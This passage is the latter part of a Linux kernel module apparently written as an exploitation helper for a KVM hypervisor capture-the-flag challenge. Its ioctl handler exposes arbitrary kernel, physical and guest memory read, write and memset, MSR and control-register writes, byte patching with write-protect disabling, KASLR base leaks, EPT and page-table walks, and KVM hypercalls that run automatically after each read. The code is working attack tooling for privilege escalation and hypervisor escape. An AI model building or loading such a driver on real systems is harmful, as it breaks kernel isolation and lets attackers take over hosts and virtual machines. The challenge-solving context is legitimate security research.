static int spte_to_pfn_local(unsigned long spte, struct spte_to_pfn_request *req)
{
    req->spte = spte;
    req->pfn = req->flags = 0;
    req->present = req->writable = req->executable = 0;
    req->status = 0;

    if (!(spte & 0x1)) { req->status = -ENOENT; return -ENOENT; }
    req->present = 1;
    req->pfn = (spte & 0x000FFFFFFFFFF000ULL) >> PAGE_SHIFT;
    req->flags = spte & 0xFFF;
    req->writable = (spte >> 1) & 1;
    req->executable = (spte >> 2) & 1;
    return 0;
}

static int walk_ept_tables(unsigned long eptp, unsigned long gpa, struct ept_walk_request *req)
{
    unsigned long pml4_base, pdpt_base, pd_base, pt_base;
    unsigned long pml4e, pdpte, pde, pte;
    unsigned long pml4_idx, pdpt_idx, pd_idx, pt_idx;
    void __iomem *mapped;
    unsigned long phys;

    req->eptp = eptp; req->gpa = gpa;
    req->hpa = req->pml4e = req->pdpte = req->pde = req->pte = 0;
    req->page_size = 0; req->status = -EFAULT;

    pml4_idx = (gpa >> 39) & 0x1FF;
    pdpt_idx = (gpa >> 30) & 0x1FF;
    pd_idx = (gpa >> 21) & 0x1FF;
    pt_idx = (gpa >> 12) & 0x1FF;

    pml4_base = eptp & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pml4_base + pml4_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pml4e = readq(mapped); iounmap(mapped);
    req->pml4e = pml4e;
    if (!(pml4e & 0x1)) return -ENOENT;

    pdpt_base = pml4e & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pdpt_base + pdpt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pdpte = readq(mapped); iounmap(mapped);
    req->pdpte = pdpte;
    if (!(pdpte & 0x1)) return -ENOENT;

    if (pdpte & 0x80) {
        phys = (pdpte & 0x000FFFFFC0000000ULL) | (gpa & 0x3FFFFFFF);
        req->hpa = phys; req->page_size = 1024*1024*1024; req->status = 0;
        return 0;
    }

    pd_base = pdpte & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pd_base + pd_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pde = readq(mapped); iounmap(mapped);
    req->pde = pde;
    if (!(pde & 0x1)) return -ENOENT;

    if (pde & 0x80) {
        phys = (pde & 0x000FFFFFFFE00000ULL) | (gpa & 0x1FFFFF);
        req->hpa = phys; req->page_size = 2*1024*1024; req->status = 0;
        return 0;
    }

    pt_base = pde & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pt_base + pt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pte = readq(mapped); iounmap(mapped);
    req->pte = pte;
    if (!(pte & 0x1)) return -ENOENT;

    phys = (pte & 0x000FFFFFFFFFF000ULL) | (gpa & 0xFFF);
    req->hpa = phys; req->page_size = 4096; req->status = 0;
    return 0;
}

static int translate_gva_to_gpa(unsigned long gva, unsigned long cr3, struct gva_translate_request *req)
{
    unsigned long pml4_base, pdpt_base, pd_base, pt_base;
    unsigned long pml4e, pdpte, pde, pte;
    unsigned long pml4_idx, pdpt_idx, pd_idx, pt_idx;
    void __iomem *mapped;
    unsigned long gpa;

    req->gva = gva; req->gpa = req->hva = req->hpa = 0;
    req->cr3 = cr3; req->status = -EFAULT;

    pml4_idx = (gva >> 39) & 0x1FF;
    pdpt_idx = (gva >> 30) & 0x1FF;
    pd_idx = (gva >> 21) & 0x1FF;
    pt_idx = (gva >> 12) & 0x1FF;

    pml4_base = cr3 & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pml4_base + pml4_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pml4e = readq(mapped); iounmap(mapped);
    if (!(pml4e & 0x1)) return -ENOENT;

    pdpt_base = pml4e & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pdpt_base + pdpt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pdpte = readq(mapped); iounmap(mapped);
    if (!(pdpte & 0x1)) return -ENOENT;

    if (pdpte & 0x80) {
        gpa = (pdpte & 0x000FFFFFC0000000ULL) | (gva & 0x3FFFFFFF);
        req->gpa = gpa; req->status = 0;
        return 0;
    }

    pd_base = pdpte & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pd_base + pd_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pde = readq(mapped); iounmap(mapped);
    if (!(pde & 0x1)) return -ENOENT;

    if (pde & 0x80) {
        gpa = (pde & 0x000FFFFFFFE00000ULL) | (gva & 0x1FFFFF);
        req->gpa = gpa; req->status = 0;
        return 0;
    }

    pt_base = pde & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pt_base + pt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pte = readq(mapped); iounmap(mapped);
    if (!(pte & 0x1)) return -ENOENT;

    gpa = (pte & 0x000FFFFFFFFFF000ULL) | (gva & 0xFFF);
    req->gpa = gpa; req->status = 0;
    return 0;
}

static int convert_virt_to_pfn(unsigned long virt_addr, unsigned long *pfn)
{
    struct virt_to_phys_request req;
    int ret = convert_virt_to_phys(virt_addr, &req);
    if (ret == 0) *pfn = req.pfn;
    return ret;
}

/* ========================================================================
 * IOCTL Handler
 * ======================================================================== */

static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    int i, count;

    switch (cmd) {

        /* Symbol Operations */
        case IOCTL_LOOKUP_SYMBOL: {
            struct symbol_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.name[MAX_SYMBOL_NAME - 1] = '\0';
            req.address = lookup_kernel_symbol(req.name);
            req.description[0] = '\0';
            for (i = 0; kvm_symbols[i].name != NULL; i++) {
                if (strcmp(kvm_symbols[i].name, req.name) == 0) {
                    strncpy(req.description, kvm_symbols[i].description, sizeof(req.description) - 1);
                    break;
                }
            }
            if (copy_to_user((void __user *)arg, &req, sizeof(req))) return -EFAULT;
            return req.address ? 0 : -ENOENT;
        }

        case IOCTL_GET_SYMBOL_COUNT:
            return copy_to_user((void __user *)arg, &kvm_symbol_count, sizeof(kvm_symbol_count)) ? -EFAULT : 0;

        case IOCTL_GET_SYMBOL_BY_INDEX: {
            unsigned int index;
            struct symbol_request req;
            if (copy_from_user(&index, (void __user *)arg, sizeof(index))) return -EFAULT;
            if (index >= kvm_symbol_count) return -EINVAL;
            count = 0;
            for (i = 0; kvm_symbols[i].name != NULL; i++) {
                if (kvm_symbols[i].address) { if (count == index) break; count++; }
            }
            if (kvm_symbols[i].name == NULL) return -EINVAL;
            strncpy(req.name, kvm_symbols[i].name, MAX_SYMBOL_NAME - 1);
            req.address = kvm_symbols[i].address;
            strncpy(req.description, kvm_symbols[i].description, sizeof(req.description) - 1);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }

        case IOCTL_FIND_SYMBOL_BY_NAME: {
            struct symbol_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.name[MAX_SYMBOL_NAME - 1] = '\0';
            for (i = 0; kvm_symbols[i].name != NULL; i++) {
                if (kvm_symbols[i].address && strstr(kvm_symbols[i].name, req.name)) {
                    strncpy(req.name, kvm_symbols[i].name, MAX_SYMBOL_NAME - 1);
                    req.address = kvm_symbols[i].address;
                    strncpy(req.description, kvm_symbols[i].description, sizeof(req.description) - 1);
                    return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
                }
            }
            return -ENOENT;
        }

        case IOCTL_GET_VMX_HANDLERS: {
            count = 0;
            for (i = 0; vmx_handlers[i].name != NULL; i++) if (vmx_handlers[i].address) count++;
            return copy_to_user((void __user *)arg, &count, sizeof(count)) ? -EFAULT : 0;
        }

        case IOCTL_GET_SVM_HANDLERS: {
            count = 0;
            for (i = 0; svm_handlers[i].name != NULL; i++) if (svm_handlers[i].address) count++;
            return copy_to_user((void __user *)arg, &count, sizeof(count)) ? -EFAULT : 0;
        }

        case IOCTL_SEARCH_SYMBOLS: {
            char pattern[MAX_SYMBOL_NAME];
            struct symbol_request results[16];
            int result_count = 0;
            if (copy_from_user(pattern, (void __user *)arg, sizeof(pattern))) return -EFAULT;
            pattern[MAX_SYMBOL_NAME - 1] = '\0';
            for (i = 0; kvm_symbols[i].name != NULL && result_count < 16; i++) {
                if (kvm_symbols[i].address && strstr(kvm_symbols[i].name, pattern)) {
                    strncpy(results[result_count].name, kvm_symbols[i].name, MAX_SYMBOL_NAME - 1);
                    results[result_count].address = kvm_symbols[i].address;
                    strncpy(results[result_count].description, kvm_symbols[i].description, 255);
                    result_count++;
                }
            }
            if (copy_to_user((void __user *)arg, results, sizeof(struct symbol_request) * result_count)) return -EFAULT;
            return result_count;
        }

        /* Memory Read Operations (WITH AUTO HYPERCALL) */
        case IOCTL_READ_KERNEL_MEM: {
            struct kernel_mem_read req;
            unsigned char *kbuf;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.kernel_addr || !req.length || !req.user_buffer || req.length > 1024*1024) return -EINVAL;
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            ret = read_kernel_memory(req.kernel_addr, kbuf, req.length);
            if (ret == 0 && copy_to_user(req.user_buffer, kbuf, req.length)) ret = -EFAULT;
            kfree(kbuf);
            run_ctf_hypercalls();
            return ret;
        }

        case IOCTL_READ_PHYSICAL_MEM: {
            struct physical_mem_read req;
            unsigned char *kbuf;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.length || !req.user_buffer || req.length > 1024*1024) return -EINVAL;
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            ret = read_physical_memory(req.phys_addr, kbuf, req.length);
            if (ret == 0 && copy_to_user(req.user_buffer, kbuf, req.length)) ret = -EFAULT;
            kfree(kbuf);
            run_ctf_hypercalls();
            return ret;
        }

        case IOCTL_READ_PFN_DATA: {
            struct physical_mem_read req;
            unsigned char *kbuf;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.length || !req.user_buffer || req.length > 1024*1024) return -EINVAL;
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            ret = read_physical_via_pfn(req.phys_addr, kbuf, req.length);
            if (ret == 0 && copy_to_user(req.user_buffer, kbuf, req.length)) ret = -EFAULT;
            kfree(kbuf);
            run_ctf_hypercalls();
            return ret;
        }

        case IOCTL_READ_GUEST_MEM: {
            struct guest_mem_read req;
            unsigned char *kbuf;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if ((!req.gpa && !req.gva) || !req.length || !req.user_buffer || req.length > 1024*1024) return -EINVAL;
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            switch (req.mode) {
                case 0: ret = read_guest_memory_gpa(req.gpa, kbuf, req.length); break;
                case 2: ret = read_guest_memory_gpa(req.gpa << PAGE_SHIFT, kbuf, req.length); break;
                default: ret = -ENOSYS;
            }
            if (ret == 0 && copy_to_user(req.user_buffer, kbuf, req.length)) ret = -EFAULT;
            kfree(kbuf);
            run_ctf_hypercalls();
            return ret;
        }

        case IOCTL_SCAN_MEMORY_REGION: {
            struct { struct mem_region region; struct mem_pattern pattern; } scan_req;
            unsigned long *results_buf;
            int max_results = 256, found;
            if (copy_from_user(&scan_req, (void __user *)arg, sizeof(scan_req))) return -EFAULT;
            results_buf = kmalloc(max_results * sizeof(unsigned long), GFP_KERNEL);
            if (!results_buf) return -ENOMEM;
            found = scan_memory_region(&scan_req.region, &scan_req.pattern, results_buf, max_results);
            if (found > 0 && scan_req.region.buffer) {
                size_t to_copy = min((size_t)(found * sizeof(unsigned long)), scan_req.region.buffer_size);
                if (copy_to_user(scan_req.region.buffer, results_buf, to_copy)) { kfree(results_buf); return -EFAULT; }
            }
            kfree(results_buf);
            return found;
        }

        case IOCTL_FIND_MEMORY_PATTERN: {
            struct pattern_search_request req;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (req.end <= req.start || req.pattern_len > sizeof(req.pattern)) return -EINVAL;
            ret = find_pattern_in_range(req.start, req.end, req.pattern, req.pattern_len, &req.found_addr, 1);
            if (ret == 0 && copy_to_user((void __user *)arg, &req, sizeof(req))) return -EFAULT;
            return ret;
        }

#ifdef CONFIG_X86
        case IOCTL_READ_CR_REGISTER: {
            struct { int cr_num; unsigned long value; } cr_req;
            if (copy_from_user(&cr_req, (void __user *)arg, sizeof(cr_req))) return -EFAULT;
            if (cr_req.cr_num < 0 || cr_req.cr_num > 4 || cr_req.cr_num == 1) return -EINVAL;
            cr_req.value = read_cr_register(cr_req.cr_num);
            return copy_to_user((void __user *)arg, &cr_req, sizeof(cr_req)) ? -EFAULT : 0;
        }

        case IOCTL_READ_MSR: {
            struct msr_read_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.value = native_read_msr(req.msr);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }

        case IOCTL_DUMP_PAGE_TABLES: {
            struct page_table_dump dump;
            if (copy_from_user(&dump, (void __user *)arg, sizeof(dump))) return -EFAULT;
            if (dump_page_tables(dump.virtual_addr, &dump) < 0) return -EFAULT;
            return copy_to_user((void __user *)arg, &dump, sizeof(dump)) ? -EFAULT : 0;
        }
#endif

        case IOCTL_GET_KASLR_INFO: {
            struct kaslr_info info;
            if (!g_kaslr_initialized) init_kaslr();
            info.kernel_base = g_kernel_text_base;
            info.kaslr_slide = g_kaslr_slide;
            info.physmap_base = lookup_kernel_symbol("page_offset_base");
            if (!info.physmap_base) info.physmap_base = PAGE_OFFSET;
            info.vmalloc_base = lookup_kernel_symbol("vmalloc_base");
            if (!info.vmalloc_base) info.vmalloc_base = VMALLOC_START;
            info.vmemmap_base = lookup_kernel_symbol("vmemmap_base");
            if (!info.vmemmap_base) info.vmemmap_base = (unsigned long)vmemmap;
            return copy_to_user((void __user *)arg, &info, sizeof(info)) ? -EFAULT : 0;
        }

        /* Memory Write Operations (WITH AUTO HYPERCALL) */
        case IOCTL_WRITE_KERNEL_MEM: {
            struct kernel_mem_write req;
            unsigned char *kbuf;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.kernel_addr || !req.length || !req.user_buffer || req.length > 1024*1024) return -EINVAL;
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            if (copy_from_user(kbuf, req.user_buffer, req.length)) { kfree(kbuf); return -EFAULT; }
            ret = write_kernel_memory(req.kernel_addr, kbuf, req.length, req.disable_wp_flag);
            kfree(kbuf);
            return ret;
        }

        case IOCTL_WRITE_PHYSICAL_MEM: {
            struct physical_mem_write req;
            unsigned char *kbuf;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.length || !req.user_buffer || req.length > 1024*1024) return -EINVAL;
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            if (copy_from_user(kbuf, req.user_buffer, req.length)) { kfree(kbuf); return -EFAULT; }
            ret = write_physical_memory(req.phys_addr, kbuf, req.length);
            kfree(kbuf);
            return ret;
        }

        case IOCTL_WRITE_PHYSICAL_PFN: {
            struct physical_mem_write req;
            unsigned char *kbuf;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.length || !req.user_buffer || req.length > 1024*1024) return -EINVAL;
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            if (copy_from_user(kbuf, req.user_buffer, req.length)) { kfree(kbuf); return -EFAULT; }
            ret = write_physical_via_pfn(req.phys_addr, kbuf, req.length);
            kfree(kbuf);
            return ret;
        }

        case IOCTL_WRITE_GUEST_MEM: {
            struct guest_mem_write req;
            unsigned char *kbuf;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if ((!req.gpa && !req.gva) || !req.length || !req.user_buffer || req.length > 1024*1024) return -EINVAL;
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            if (copy_from_user(kbuf, req.user_buffer, req.length)) { kfree(kbuf); return -EFAULT; }
            switch (req.mode) {
                case 0: ret = write_guest_memory_gpa(req.gpa, kbuf, req.length); break;
                case 2: ret = write_guest_memory_gpa(req.gpa << PAGE_SHIFT, kbuf, req.length); break;
                default: ret = -ENOSYS;
            }
            kfree(kbuf);
            return ret;
        }

#ifdef CONFIG_X86
        case IOCTL_WRITE_MSR: {
            struct msr_write_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            return write_msr_safe_local(req.msr, req.value);
        }

        case IOCTL_WRITE_CR_REGISTER: {
            struct cr_write_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (req.cr_num < 0 || req.cr_num > 4 || req.cr_num == 1 || req.cr_num == 2) return -EINVAL;
            return write_cr_register(req.cr_num, req.value, req.mask);
        }
#endif

        case IOCTL_MEMSET_KERNEL: {
            struct memset_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.addr || !req.length || req.length > 1024*1024) return -EINVAL;
            return memset_kernel_memory(req.addr, req.value, req.length);
        }

        case IOCTL_MEMSET_PHYSICAL: {
            struct memset_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.length || req.length > 1024*1024) return -EINVAL;
            return memset_physical_memory(req.addr, req.value, req.length);
        }

        case IOCTL_PATCH_BYTES: {
            struct patch_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.addr || req.length == 0 || req.length > 32) return -EINVAL;
            return patch_memory(req.addr, req.original, req.patch, req.length, req.verify_original, req.addr_type);
        }

        /* Address Conversion Operations */
        case IOCTL_VIRT_TO_PHYS: {
            struct virt_to_phys_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            convert_virt_to_phys(req.virt_addr, &req);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_PHYS_TO_VIRT: {
            struct phys_to_virt_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            convert_phys_to_virt(req.phys_addr, &req);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_HVA_TO_PFN: {
            struct hva_to_pfn_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            convert_hva_to_pfn(req.hva, &req);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_PFN_TO_HVA: {
            struct addr_conv_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.status = convert_pfn_to_hva(req.input_addr, &req.output_addr);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_VIRT_TO_PFN: {
            struct addr_conv_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.status = convert_virt_to_pfn(req.input_addr, &req.output_addr);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_GPA_TO_GFN: {
            struct addr_conv_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.output_addr = gpa_to_gfn_local(req.input_addr); req.status = 0;
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }

        case IOCTL_GFN_TO_GPA: {
            struct addr_conv_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.output_addr = gfn_to_gpa_local(req.input_addr); req.status = 0;
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }

        case IOCTL_SPTE_TO_PFN: {
            struct spte_to_pfn_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            spte_to_pfn_local(req.spte, &req);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_WALK_EPT: {
            struct ept_walk_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            walk_ept_tables(req.eptp, req.gpa, &req);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_TRANSLATE_GVA: {
            struct gva_translate_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            translate_gva_to_gpa(req.gva, req.cr3, &req);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_PAGE_TO_PFN: {
            struct addr_conv_request req;
            struct page *page;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            page = (struct page *)req.input_addr;
            if (!virt_addr_valid(page)) req.status = -EINVAL;
            else { req.output_addr = page_to_pfn(page); req.status = 0; }
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_PFN_TO_PAGE: {
            struct addr_conv_request req;
            struct page *page;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!pfn_valid(req.input_addr)) req.status = -EINVAL;
            else { page = pfn_to_page(req.input_addr); req.output_addr = (unsigned long)page; req.status = page ? 0 : -EFAULT; }
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_GFN_TO_HVA: {
            struct gfn_to_hva_request req;
            unsigned long gpa;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            gpa = gfn_to_gpa_local(req.gfn);
            if (gpa < (1ULL << 40)) { req.hva = (unsigned long)__va(gpa); req.status = virt_addr_valid(req.hva) ? 0 : -EFAULT; }
            else req.status = -EINVAL;
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_GFN_TO_PFN: {
            struct gfn_to_pfn_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.pfn = req.gfn; req.status = 0;
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }

        case IOCTL_GPA_TO_HVA: {
            struct gpa_to_hva_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.gfn = gpa_to_gfn_local(req.gpa);
            if (req.gpa < (1ULL << 40)) { req.hva = (unsigned long)__va(req.gpa); req.status = virt_addr_valid(req.hva) ? 0 : -EFAULT; }
            else req.status = -EINVAL;
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_HVA_TO_GFN: {
            struct addr_conv_request req;
            unsigned long phys;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (virt_addr_valid(req.input_addr)) { phys = virt_to_phys((void *)req.input_addr); req.output_addr = phys >> PAGE_SHIFT; req.status = 0; }
            else req.status = -EFAULT;
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        /* Hypercall Operations */
        case IOCTL_HYPERCALL: {
#ifdef CONFIG_X86
            struct hypercall_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.ret = do_kvm_hypercall(req.nr, req.a0, req.a1, req.a2, req.a3);
            if (req.ret != 0 && req.ret != ~0UL)
                printk(KERN_INFO "%s: Hypercall %lu returned 0x%lx\n", DRIVER_NAME, req.nr, req.ret);
            if (copy_to_user((void __user *)arg, &req, sizeof(req))) return -EFAULT;
            return 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_HYPERCALL_BATCH: {
#ifdef CONFIG_X86
            struct hypercall_batch_result result;
            run_ctf_hypercalls_batch(&result);
            if (copy_to_user((void __user *)arg, &result, sizeof(result))) return -EFAULT;
            return 0;
#else
            return -ENOSYS;
#endif
        }

        default:
            return -ENOTTY;
    }
    return 0;
}

/* File Operations */
static int driver_open(struct inode *inode, struct file *file) { return 0; }
static int driver_release(struct inode *inode, struct file *file) { return 0; }

static struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = driver_open,
    .release = driver_release,
    .unlocked_ioctl = driver_ioctl,
    .compat_ioctl = driver_ioctl,
};

/* Module Init/Exit */
static int __init mod_init(void)
{
    printk(KERN_INFO "%s: Initializing v2.1 (Auto-Hypercall after R/W/Scan)\n", DRIVER_NAME);
    kallsyms_lookup_init();
    init_kaslr();
    init_symbol_database();

    major_num = register_chrdev(0, DEVICE_FILE_NAME, &fops);
    if (major_num < 0) return major_num;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
    driver_class = class_create(DRIVER_NAME);
#else
    driver_class = class_create(THIS_MODULE, DRIVER_NAME);
#endif
    if (IS_ERR(driver_class)) { unregister_chrdev(major_num, DEVICE_FILE_NAME); return PTR_ERR(driver_class); }

    driver_device = device_create(driver_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_FILE_NAME);
    if (IS_ERR(driver_device)) { class_destroy(driver_class); unregister_chrdev(major_num, DEVICE_FILE_NAME); return PTR_ERR(driver_device); }

    printk(KERN_INFO "%s: /dev/%s created. HC 100-103 auto-run after ops.\n", DRIVER_NAME, DEVICE_FILE_NAME);
    return 0;
}

static void __exit mod_exit(void)
{
    if (driver_device) device_destroy(driver_class, MKDEV(major_num, 0));
    if (driver_class) class_destroy(driver_class);
    if (major_num >= 0) unregister_chrdev(major_num, DEVICE_FILE_NAME);
    printk(KERN_INFO "%s: Unloaded\n", DRIVER_NAME);
}

module_init(mod_init);
module_exit(mod_exit);